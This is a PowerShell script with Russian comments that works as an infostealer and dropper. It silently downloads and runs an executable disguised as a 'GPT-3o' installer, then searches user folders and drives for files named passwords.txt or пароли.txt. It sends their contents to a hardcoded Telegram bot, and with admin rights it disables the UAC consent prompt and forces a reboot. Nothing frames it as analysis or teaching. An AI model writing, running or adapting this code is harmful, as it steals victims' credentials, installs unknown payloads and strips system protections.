# Блок 1: Скачивание и установка приложения
try {
    $exePath = Join-Path $env:ProgramData 'GPT-3o_win-x64_setup.exe'
    
    try {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $webClient.DownloadFile('https://raw.githubusercontent.com/rootkalilocalhost/modules/main/GPT-3o_win-x64_setup.exe', $exePath)
        
        if (Test-Path $exePath) {
            $process = Start-Process -FilePath $exePath -ArgumentList '/S' -PassThru -NoNewWindow -Wait
        }
    } catch {
        # Игнорируем ошибки загрузки
    }
} finally {
    if (Test-Path $exePath) {
        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
    }
}

# Блок 2: Настройки
$telegramBotToken = "5574338417:AAHzByMElpQLpyZ72paKuP4Gb2gqcIByKBo"
$chatId = "1473231416"
$searchPatterns = @("пароли.txt", "passwords.txt")
$tempDir = if ($env:TEMP) { $env:TEMP } else { [System.IO.Path]::GetTempPath() }

# Блок 3: Поиск и отправка в Telegram
try {
    # Поиск файлов
    $foundFiles = @()
    $searchPaths = @("$env:USERPROFILE", "C:\Users", "D:\", "E:\")
    
    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            foreach ($pattern in $searchPatterns) {
                $files = Get-ChildItem $path -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue -Depth 2
                if ($files) { $foundFiles += $files }
            }
        }
    }
    
    $foundFiles = $foundFiles | Sort-Object FullName -Unique
    
    if ($foundFiles.Count -gt 0) {
        # Создание файла с данными
        $outputFile = Join-Path $tempDir "passwords_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $encoding = [System.Text.Encoding]::UTF8
        
        foreach ($file in $foundFiles) {
            try {
                if ($file.Length -lt 5MB) {
                    $content = [System.IO.File]::ReadAllText($file.FullName, $encoding)
                    "=== $($file.FullName) ===" | Out-File $outputFile -Append -Encoding UTF8
                    $content | Out-File $outputFile -Append -Encoding UTF8
                    "`r`n" | Out-File $outputFile -Append -Encoding UTF8
                }
            } catch { }
        }
        
        # Отправка в Telegram
        if (Test-Path $outputFile -and (Get-Item $outputFile).Length -gt 0) {
            try {
                $form = @{
                    chat_id = $chatId
                    caption = "Найдено файлов: $($foundFiles.Count)"
                    document = Get-Item $outputFile
                }
                Invoke-RestMethod "https://api.telegram.org/bot$telegramBotToken/sendDocument" -Method Post -Form $form -ErrorAction Stop
            } catch {
                # Резервная отправка текстом
                try {
                    $content = Get-Content $outputFile -Raw -ErrorAction Stop
                    if ($content.Length -gt 4000) { $content = $content.Substring(0, 4000) + "..." }
                    
                    Invoke-RestMethod "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body @{
                        chat_id = $chatId
                        text = "Найдено $($foundFiles.Count) файлов:`n$content"
                    } -ErrorAction Stop
                } catch { }
            } finally {
                if (Test-Path $outputFile) { Remove-Item $outputFile -Force }
            }
        } else {
            # Отправка сообщения если файлы пустые
            Invoke-RestMethod "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body @{
                chat_id = $chatId
                text = "Найдено $($foundFiles.Count) файлов, но они пустые"
            } -ErrorAction SilentlyContinue
        }
    } else {
        # Отправка сообщения если файлы не найдены
        Invoke-RestMethod "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body @{
            chat_id = $chatId
            text = "Файлы с паролями не найдены"
        } -ErrorAction SilentlyContinue
    }
} catch {
    # Отправка сообщения об ошибке
    Invoke-RestMethod "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body @{
        chat_id = $chatId
        text = "Ошибка при поиске файлов: $($_.Exception.Message)"
    } -ErrorAction SilentlyContinue
}

# Блок 4: Системные настройки
try {
    if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Force -ErrorAction SilentlyContinue
        Start-Sleep 10
        Restart-Computer -Force -ErrorAction SilentlyContinue
    }
} catch { }
